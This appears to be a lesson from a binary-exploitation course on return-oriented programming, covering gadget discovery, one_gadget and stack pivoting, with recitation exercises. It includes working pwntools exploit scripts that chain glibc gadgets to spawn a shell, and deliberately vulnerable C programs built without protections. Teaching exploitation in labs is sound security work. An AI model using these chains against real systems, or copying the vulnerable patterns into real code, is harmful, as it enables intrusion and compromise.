Offensive cybersecurity can be thought of as a cat and mouse game between exploit developers and security engineers—exploits spur new security enforcements which in turn engender novel exploit techniques. Stack buffer overflows, GOT overwrites, and shellcode are all techniques which depend on the absence of modern mitigations (stack canaries, Full RELRO, and RWX pages, respectively). But with new mitigations comes exploitation ingenuity, including _return-oriented programming_ (ROP).

ROP is a technique that affects nearly all systems and is still extremely relevant in modern exploitation. It requires only two ingredients: stack and program counter control. These are not necessarily trivial to obtain, but we can use primitives like buffer overflows and arbitrary writes to set ourselves up for ROP. Let's take a look at how ROP works after we have the necessary control, and then discuss how to reach that point with different primitives.

## How It Works
- previous problem: memory blocks are WRITE XOR EXECUTE (cannot be both writable and executable) --> makes it difficult for us to inject custom code AND run it

ROP addresses the mitigation of `W^X` pages discussed in the shellcode section, which limits us to running instructions only in the binary and executable (non-arbitrary instructions). But we've seen before in the [[5. Introduction to Binary Exploitation]] section how a stack buffer overflow can jump program execution to the beginning of a different function _or to any instruction within the function_. This is the trick that ROP capitalizes on, but focusing specifically on instructions that precede a `ret`.

We are familiar with the `ret` instruction and how it pops the next value on the stack, the pushed return instruction pointer, into `rip` during the epilogue. Consider now that we control the entire stack along with the current address of `rip`. What happens if we jump to a `ret`? It will do what it is intended to do: pop the next eight-byte address off the stack into `rip`. This means we jump execution from the `ret` instruction to wherever that address points to. Since we control the stack, we control that address as well. What if we pointed that address to another `ret` instruction? We would again pop the next address on the stack, which we presumably control as well.

![[ret_ret_ret.png]]

That is not a very exciting scenario, but it does prove that we could continue execution so long as we maintained control over the next eight bytes on the stack. Consider now if we jumped a few instructions before a `ret`, such as `mov rdi, 0; mov rsi, 0xdeadbeef; ret`. The program would execute the first two instructions, updating `rdi` and `rsi`, and then pop the following address off the stack. This is more interesting, as we have just controlled register state _and_ maintained execution control! If we remember, one of the limitations of our stack buffer overflows is that we only controlled `rip` and thus relied on jumping to a location that did not require our registers to be in a particular state to pop a shell. We later enhanced our control by executing shellcode to directly control registers and syscalls, but that technique is limited by modern protections. Now, we have reclaimed that capability with ROP.

### Building a ROP Chain

Achieving RCE requires building a series of addresses and values on the stack which jump to desired code that sets registers to needed values. This series is called a _ROP chain_. A single jump point prior to a `ret` instruction is called a _ROP gadget_, so a ROP chain consists of a series of individual ROP gadgets. Understanding how the chain works gadget-by-gadget is useful in building and incrementally testing a ROP chain.

It's first important to understand what constitutes a gadget. We considered an example gadget in the prior section which sets values of `rdi` and `rsi` to absolute values before returning. This is useful if we want `0x0` in `rdi` and `0xdeadbeef` in `rsi`, but more often than not we want to control the value in each register. In this case we want gadgets that `pop` a value into the registers. Since we control the stack, we control the address that is jumped to _and_ all subsequent `pop`ped values (including the address popped into `rip` during `ret`, as previously discussed). 

Consider a gadget that is `pop rdi; ret`, which is a particularly common gadget found in most binaries. This gadget requires that we set the address that points to the `pop rdi` instruction on the stack, followed immediately by the eight bytes that we desire in `rdi`. When execution continues, we still maintain control of `rip` by placing another gadget's address on the stack after the value destined for `rdi`. Execution continues into this gadget, say `pop rsi; ret`, which lets us control yet another register. The example below outlines this process with color-coded ROP gadgets and detailed stack and execution flow, demonstrating how we can pop chosen values `0xdeadbeef` into `rdi` and `0x1337c0d3` into `rsi`.

![[rop_chain.png]]

We can use this philosophy incrementally to achieve a variety of outcomes, including popping a shell!

### ROPping to Pop a Shell

Let's practice ROP by trying to pop a shell in the following program, [[rop]], the [[rop.c |source of which]] is shown below:

```c
#include "stdlib.h"
#include "stdio.h"
#include "unistd.h"

// compile with `gcc rop.c -no-pie -fno-pic -o rop -w -fno-stack-protector`

int main() {
    char buf[0x20];
    puts("Give me a ROP chain!");
    printf("You might find this value helpful...");
    fflush(stdout);
    void* p = &stdin;
    write(1, p, 8);
    puts("");
    gets(buf);
    return 0;
}
```

The program leaks a glibc address for us, the address of the `_IO_2_1_stdin_` symbol, which we would otherwise need to obtain using a leak primitive. It also clearly has a stack buffer overflow vulnerability. However, we have no "win" function that will easily pop us a shell, nor the ability to run shellcode. But since we have stack control via the stack buffer overflow, we have ROP at our disposal.

Let's set up a stub solver script that processes the leaked address to find the base address of glibc using `pwntools.elf.ELF`:

```python
from pwn import *

p = process("./rop")
e = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

p.recvuntil(b"helpful...")
stdin = u64(p.recv(8))
p.recvuntil(b"\n")
glibc_base = stdin - e.symbols._IO_2_1_stdin_
assert glibc_base == glibc_base & ~0xfff, "Error: glibc base address not page-aligned!"

# fill out ROP chain and send

p.interactive()
```

We assert above that the calculated glibc base address is aligned; the `assert` checks that the last three nibbles in the base are all zero—the base must be aligned to a virtual memory page, and pages are always increments of `0x1000` bytes.

Now we need to find some gadgets to form our ROP chain.

#### Finding ROP Gadgets

How do we find ROP gadgets for our payload? A valid but tedious approach is searching through the binary and all imported libraries for `ret` instructions and checking what precedes them. This is extremely time consuming and unfortunately does not yield a ton of results. We commonly want to control argument registers like `rdi`, `rsi`, `rdx`, etc. Our x64 calling convention unfortunately lists these registers as [volatile](https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170#callercallee-saved-registers) meaning they are not reset prior to exiting a function—only `rbx, rbp, rdi, rsi, rsp, r12, r13, r14, r15, and xmm6-xmm15`  are guaranteed to be saved. Consequently, finding `pop rdi` or similar instructions right before a `ret` in the program's disassembly can be difficult.

We can significantly expand our search space by understanding more about x64 assembly. The `x86_64` architecture has a _variable width_ instruction set, meaning instructions can range in length from one to eight bytes (which form the instruction's operation code). We can see this in Binja or Ghidra by looking at the op code bytes preceding an instruction:

```nasm
f30f1efa           endbr64 
b83b000000         mov     eax, 0x3b
0f05               syscall 
483d01f0ffff       cmp     rax, 0xfffffffffffff001
7301               jae     0xeb084
```

This is different from other architectures, such as MIPS or ARM64, which have fixed-width instructions. Because they have a guaranteed size, the processor in those architectures expects some guarantee of alignment; for a four-byte instruction size, the address in the program counter must be a multiple of four. x64 cannot guarantee this, since the width of an instruction can vary.

The consequence of this behavior is that we can jump the program counter to any executable code address, _including in the middle of an (intended) instruction_. The program counter will interpret the instruction from the current address's op code moving forward, meaning it will likely execute totally different instructions.

Consider, for example, the following instructions in glibc's `iconv` function. We see from `objdump` that the program restores some non-volatile registers before returning, as required by the calling convention!

```console
$ objdump -M intel --disassemble=iconv /lib/x86_64-linux-gnu/libc.so.6
# ... snip ...
   2878c:	5b                   	pop    rbx
   2878d:	5d                   	pop    rbp
   2878e:	41 5c                	pop    r12
   28790:	41 5d                	pop    r13
   28792:	41 5e                	pop    r14
   28794:	41 5f                	pop    r15
   28796:	c3                   	ret
```

This is a really handy gadget for popping a lot of registers, but not `rdi`. However, what happens if we start disassembling in the middle of the `pop r15` instruction? 

```console
$ objdump -M intel --disassemble --start-address=0x028795 /lib/x86_64-linux-gnu/libc.so.6 | head

0000000000028795 <iconv@@GLIBC_2.2.5+0xb5>:
   28795:	5f                   	pop    rdi
   28796:	c3                   	ret
```

We see the op code `0x5f` is the `pop rdi` instruction and the `ret` instruction is subsequently interpreted correctly! It turns out the `ret` op code is a single byte, `c3` which is conveniently prevalent in a large codebase like glibc. With that knowledge, we can greatly expand our search for viable gadgets using some helpful tools of the trade.

The `ROPGadget` tool returns program gadgets based on a variety of criteria. [Clone the repo](https://github.com/JonathanSalwan/ROPgadget.git) and install or just install directly in a Python environment with `python3 -m pip install ROPgadget`. `ROPGadget` exposes a number of command line flags, including the `--depth` (number of instructions) of the gadget. It fetches more than just `pop ...; ret` gadgets, including gadgets that jump to different hard coded or register-defined addresses. In certain cases, these types of gadgets can be invaluable.

```console
$ ROPgadget --depth 3 --binary /lib/x86_64-linux-gnu/libc.so.6 | grep pop
# ... snip ...
0x00000000000d0906 : clc ; pop rbx ; ret
0x00000000000fcdf4 : cmovne eax, edx ; pop rbx ; ret
0x0000000000042498 : movq mm0, mm2 ; pop rbx ; ret
0x0000000000161c9f : nop ; pop rbx ; ret
0x0000000000094e5e : out dx, eax ; pop rbp ; jmp 0x95e30
# ... snip ...
0x00000000000ef9ac : pop rdi ; jmp 0xee120
0x00000000000e933d : pop rdi ; jmp 0xffffffff83569347
0x0000000000051a9d : pop rdi ; jmp 0xffffffff8d4d1ab9
0x000000000004619d : pop rdi ; jmp 0xffffffffb61361ba
0x000000000002c005 : pop rdi ; jmp rax
0x000000000010fc04 : pop rdi ; jmp rdi
0x0000000000028ac2 : pop rdi ; pop rbp ; ret
0x0000000000028795 : pop rdi ; ret
# ... snip ...
```

We can use `ROPGadget` combined with `grep` filtering to quickly find gadgets of interest and use their offsets in our script to complete a ROP chain.

### `pwntools.rop.ROP`

`ROPGadget` is a phenomenal tool for command line use. However there is another way to fetch ROP gadgets dynamically within a `pwntools` script using the `ROP` class. The class accepts a file path or `ELF` instance for the targeted library.

The `ROP` class provides gadgets in an indexable dictionary and will always return the shortest length gadget found. One caveat is that the gadgets are not guaranteed to be two instructions long (such as `pop REG; ret`), so we should double check the length of the gadgets when leveraging this programmatically. For instance, the `rdx` register should have a gadget in `libc`, but it may be three instructions long. This is not necessarily a problem—we just need to remember to store a value to be popped into `rbx` afterward or our chain will be misaligned.

```
>>> from pwn import *
>>> r = ROP("/lib/x86_64-linux-gnu/libc.so.6")
[*] Loaded 207 cached gadgets for '/lib/x86_64-linux-gnu/libc.so.6'
>>> r.rdx
Gadget(0x933d9, ['pop rdx', 'pop rbx', 'ret'], ['rdx', 'rbx'], 0xc)
>>> 
```

We can easily construct our chain for the prior [[rop]] example with `ROP` addresses and register values defined in an array. After, we serialize the entries into little-endian eight-byte strings and concatenate everything together.

```python
from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-f", "-h"]

p = gdb.debug("./rop", '''
b *(main + 115)
continue
''')

e = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

p.recvuntil(b"helpful...")
stdin = u64(p.recv(8))
p.recvuntil(b"\n")
glibc_base = stdin-e.symbols._IO_2_1_stdin_
assert glibc_base == glibc_base & ~0xfff, "Error: glibc base address not page-aligned!"

r = ROP(e)
e.address = glibc_base
bin_sh = next(e.search(b"/bin/sh"))
system = e.symbols.system

chain = [
    r.rdi.address + glibc_base, # pop rdi gadget
    bin_sh, # pop into rdi
    # at this point our ROP chain is an even number of quadwords. The next
    # `system` address will make it odd, meaning `sp` will not be 16-byte
    # aligned. A trick for keeping the stack aligned is adding a `ret`
    # instruction, which is essentially a no-op that advances the `sp` by 8
    r.ret.address + glibc_base, # align stack
    system # pop address of system into pc
]

# send '\n' for gets
p.sendline(b'A' * 0x38 + b"".join([p64(e) for e in chain]))
p.interactive()
```

> Note that we have a potential issue with `xmm` register instructions when calling `system` with an unaligned stack, similar to what we experienced in [[5. Introduction to Binary Exploitation]] with stack buffer overflows. Instead of jumping into `system` after the `push rbp` instruction (which would work), we can simply add a `ret` gadget anywhere in our chain. This just pops the next address off the stack—which we presumably control—and moves the stack up eight bytes. This solves our alignment problem so the shell can pop!

Like with shellcode, it is extremely useful to write and verify ROP chains incrementally to quickly identify issues. To debug, we set a breakpoint on `main`'s `ret` instruction and step into (`si`) the instruction. If our first gadget's address is in the pushed instruction pointer, our chain hijacks control. So long as our next gadgets are lined up on the stack in sync with the `ret` instructions in each preceding gadget, we maintain control as we pop through the chain.

We see below that we are about to return from `main` and the next address on the stack points to a `rop rdi` gadget. That looks great! Then we can confirm after a couple instructions that `rdi` points to `/bin/sh` and the next address to pop is `system`:

#### One Gadgets
^ a gadget that does it all.


So long as we continue to control the stack and have gadgets to set required registers, we can ROP to a shell or any other objective. But sometimes our stack control is limited, such as a short fixed-length overwrite. In this case we need to be clever with our gadgets to shorten our payload while still accomplishing our objective.

One simple strategy is to try and combine gadget functionality together. For example, instead of searching for a `pop rdi; ret` gadget followed by a `pop rsi; ret` gadget, search for one that performs both operations in one: `pop rdi; pop rsi; ret` (the `pop` instructions could be flipped, we would just need to flip the values that we pop off the stack).

But sometimes we are extremely restricted, with only one or two quadwords of control. In this case we can potentially leverage a _one gadget_. A one gadget is a gadget that sets all required registers _and_ calls `system` or `execve` to spawn a shell. One gadgets exist because libraries commonly include C code to spawn subprocesses that perform work on the existing process's behalf. If this code exists, we can potentially jump directly to it to hijack control for ourselves! The only restriction is that the program register state must be in a particular configuration to successfully spawn a shell when jumping to the landing point. 

Like `ROPGadget`, there is already a very nice tool, [`one_gadget`](https://github.com/david942j/one_gadget.git), built for finding these gadgets. `one_gadget` finds viable shell-spawning code addresses and also analyzes the program state for required constraints on other registers. We can compare `one_gadget`'s constraints to our program state by breaking right before we hijack execution and inspecting our register context in gdb. If we happen to satisfy any of the constraints, we can spawn a shell with a single jump! If not, we can look for gadgets that set the offending registers prior to making the call—presuming we have stack control for such gadgets prior to the jump.

```console
$ one_gadget  /lib/x86_64-linux-gnu/libc.so.6 
0x54f4c posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x68 is writable
  rsp & 0xf == 0
  rax == NULL || {"sh", rax, rip+0x16b4aa, r12, ...} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

0x54f53 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x68 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, rax, rip+0x16b4aa, r12, ...} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

0xeb60e execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  rbx == NULL || {"/bin/sh", rbx, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xeb66b execve("/bin/sh", rbp-0x50, [rbp-0x78])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
  [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp
```

Our register state when we hijack execution for the prior [[rop]] example is as follows:

```
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0
$rbx   : 0x00007ffdf2b8fbe8  →  0x00007ffdf2b91532  →  0x485300706f722f2e ("./rop"?)

$r11   : 0x246                                          
$r12   : 0x0                                            
$r13   : 0x00007ffdf2b8fbf8  →  0x00007ffdf2b91538  →  "SHELL=/bin/bash"
$r14   : 0x0000000000403e00  →  0x0000000000401180  →  <__do_global_dtors_aux+0000> endbr64 
$r15   : 0x00007f34c8d2f000  →  0x00007f34c8d302d0  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
```

Our registers as-are do not fulfill the `one_gadget` requirements, but we can easily make a tweak to fulfill the last case. Our overflow clobbers `rbp` as we see with the `A`s in the register state. All that we need is to set this register to an area of writable memory with a bunch of null bytes. If we had either a heap or stack leak, these would be viable options. But we have a no-PIE binary with a writable `bss` section, so let's pick an address in that range such that `[rbp-0x78]` is null.

```
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000001000 r-- rop
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x rop
0x0000000000402000 0x0000000000403000 0x0000000000001000 r-- rop
0x0000000000403000 0x0000000000404000 0x0000000000001000 r-- rop
0x0000000000404000 0x0000000000405000 0x0000000000001000 rw- rop < target this address range, e.g., 0x4040d8
```

Running again and breakpointing at the `ret`, we can double check that the conditions now hold:

```
gef➤  p/x $rbp
$1 = 0x4040d8
gef➤  p/x $rbp-0x50
$2 = 0x404088
gef➤  vmmap 0x404088
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000404000 0x0000000000405000 0x0000000000001000 rw- rop
gef➤  x/xg $rbp-0x78
0x404060:       0x0000000000000000
```

And continue execution to pop a shell with a single jump!

### Setting Ourselves Up For ROP

The example [[rop.c]] included a glibc leak and a stack buffer overflow due to `gets` so that we could focus on the ROP portion of the attack. Other targets might not be so kind, so we should briefly discuss how we might put ourselves in position given various capabilities.

As mentioned previously, ROP has two requirements: stack and program counter control. We've covered a couple of ways to obtain `rip` control, including stack buffer overflows (with no canary) and GOT overwrites. In the next lesson, [[8. Attacking the Heap (glibc <2.32)]], we'll introduce another tactic. So let's focus on the new requirement: how to attain stack control.

The stack is always randomized by ASLR and stack values are not commonly stored anywhere other than the stack; it does not really make sense to store a reference to a perhaps ephemeral stack frame on the heap or in the binary's `bss` section. So how can we leak a stack address during execution?

The answer is always _it depends_ based on the program and our control over it, but there is one useful strategy that tends to be very handy for this purpose. Glibc stores stack addresses in its RW segments, including the address of the program's environment variables (`envp`) array. That array is stored on the stack prior to entering the `main` function and remains there until the program terminates. Glibc records its address in the `__environ` symbol for quick access. We can test this in gdb:

```console
$ readelf -Ws /lib/x86_64-linux-gnu/libc.so.6 | grep __environ
   736: 0000000000206258     8 OBJECT  GLOBAL DEFAULT   33 __environ@@GLIBC_2.2.5

gef➤  vmmap 0x00007fffffffe2f8
[ Legend:  Code | Heap | Stack ]

0x00007ffffffde000 0x00007ffffffff000 0x0000000000021000 rw- [stack]
```

> The loader, `ld`, also [imports this variable](https://elixir.bootlin.com/glibc/glibc-2.40.9000/source/elf/dl-libc.c#L27) in its memory space. By default, GDB returns `ld`'s `__environ` address and value, which might not be what we're looking to test (shown below). We can manually find `libc`'s address with `readelf -Ws` and the randomized base address as shown above.
> ```
> gef➤  p/x &__environ
$1 = 0x7ffff7ffe2c0
gef➤  vmmap 0x7ffff7ffe2c0
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000002000 rw- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
> ```

Reading the value of the `__environ` variable breaks ASLR for the stack, but we need a leak of either `libc` or `ld` first. We can achieve this in a variety of ways, such as leaking either shared library by leaking GOT values as outlined in [[6. Shellcode and the GOT]]. We'll also cover a strategy for leaking libc addresses in the next lesson: [[8. Attacking the Heap (glibc <2.32)]].

With this technique we have a stack _address_, but not necessarily stack _control_. Because the address of `envp` on the stack does not change, we can calculate the relative distance between its address and the address of function frames, such as the frame to `main`. If we have an arbitrary write primitive, we could begin writing a ROP chain by clobbering the return address, `__libc_start_call_main`, pushed to the stack and all subsequent quadwords after it. When main returns, we have execution and stack control!

In other scenarios we might not have as much control, or be unable to leak a stack address. Another strategy for hijacking the stack is if we can control `rbp` or a pushed frame pointer on the stack. The `leave` instruction is essentially `mov rsp, rbp; pop rbp`. Controlling `rbp` means we can move `rsp` wherever we want at the next `leave` instruction! This is particularly handy when we have an out of bounds array access on the stack that could allow us to manipulate the pushed `rbp`. With pushed `rbp` control, we can pivot the stack to a longer ROP chain elsewhere in memory after the program processes two `ret` instructions—the first to pop the corrupted value into `rbp`, and the second to move that value into `rsp`.

## Recitation

#### Recitation 7.0

Consider the following program, [[recitation7.0.c]]:

```c
#include "stdio.h"
#include "unistd.h"

// compile with `gcc recitation7.0.c -fno-stack-protector -no-pie -fno-pic -o recitation7.0`

int main() {
    char buf[0x10];
    read(0, buf, 0x30);
    return 0;
}
```

Compile the program or use the [[recitation7.0|provided binary]] to investigate ROP in action. This is a lean program and does not have many gadgets, but it is useful for visualizing how we maintain control over the stack. Consider the following script, [[recitation7.0.py]]:

```python
from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-f", "-h"]

r = ROP("./recitation7.0")

p = gdb.debug("./recitation7.0", '''
b main
continue
''')

chain = [
    r.ret.address,
    r.ret.address,
    r.ret.address,
    r.ret.address,
]

p.send(b'A' * 0x18 + b"".join([p64(c) for c in chain]))
p.interactive()
```

This code does not spawn a shell, but it does leverage the buffer overflow to corrupt the stack and hijack RIP to point to sequential `ret` gadgets. Follow the pops off the stack and see ROP in action.

This is a pretty basic example so try editing the payload to change the value of `rbp` to `0xdeadbeef` using a `pop rbp; ret` gadget.

#### Recitation 7.1

Use `pwntools`'s `ROP` and `ROPgadget` to find gadgets in your local libc (generally at `/lib/x86_64-linux-gnu/libc.so.6`). Try and find gadgets for all six argument registers (`rdi, rsi, rdx, rcx, r8, r9`). Which ones can you find gadgets for? Which are you unable to? 

For those that have gadgets, look at the instructions that make up the gadget. Is it simply `pop <register>; ret`, or is there another `pop` in between?

#### Recitation 7.2

Consider a program with a trivial buffer overflow (e.g., `gets`). The stack is set up as:
* `0x18` byte buffer, which `gets` reads into
* `0x8` bytes of padding
* `0x8` bytes for the pushed RBP
* `0x8` bytes for the pushed RIP

Say we already have a glibc leak which provides us the address of any function or data in the library. This includes ROP gadgets for `rdi,` `,rsi`, and `rdx` (if needed). First, construct a ROP chain that results in hijacking execution flow and popping a shell. Then, combine that chain with a payload that would land on the target stack.

#### Recitation 7.3

Consider the following program, [[recitation7.3.c]]:

```c
#include "stdio.h"
#include "unistd.h"

// compile with `gcc recitation7.3.c -fno-stack-protector -no-pie -fno-pic -o recitation7.3 -masm=intel`

int func1() {
    __asm__ ("pop rdi; ret");
}

int main() {
    char buf[0x10];
    puts("Try and leak `puts` address using the GOT and PLT");
    read(0, buf, 0x30);
    return 0;
}
```

Try leveraging the buffer overflow and `rdi` gadget to leak the address of `puts`. The two questions we need to ask ourselves and answer are:
* What should we set `rdi` to so that we can leak the glibc address of `puts`?
* Where should we jump execution to so that we can get the value back to ourselves?

Once we have the leak, consider how we might maintain control and jump back into the program to continue execution and leverage the newly discovered glibc addresses.

## Next Steps

ROP is still an extremely relevant and effective technique to attack modern targets. Some systems have tried instituting defenses against ROP, and those should be noted. [Control Flow Guard](https://learn.microsoft.com/en-us/windows/win32/secbp/control-flow-guard) by Microsoft is a memory protection that attempts to block jumps into the middle or end of functions by checking the destination of indirect jumps. Addresses that do not pass the check cause a panic and prevent the exploit from proceeding.

More recently, Apple instituted [pointer authentication codes](https://support.apple.com/guide/security/operating-system-integrity-sec8b776536b/1/web/1#sec0167b469d), or PAC, on its modern devices. Pointer authentication has multiple use cases, and one is protecting against ROP. Each time a branch to a function entry occurs, the return pointer is _cryptographically signed_ with a secret key and some program context (in this case, the stack address at which the pointer is stored). When the function returns, the return pointer loaded from the stack is "decrypted." Failed decryption will almost certainly result in an attempted jump to an address that does not exist in memory. Bypassing this mitigation requires code signing gadgets, which are difficult to generate. PAC significantly raises the bar in exploit development on modern iOS and macOS.

In the next module, we'll move from attacking the stack to attacking the heap. The heap is a source of countless user-space and kernel exploits in modern systems, and is imperative to understanding how to attack complex systems.
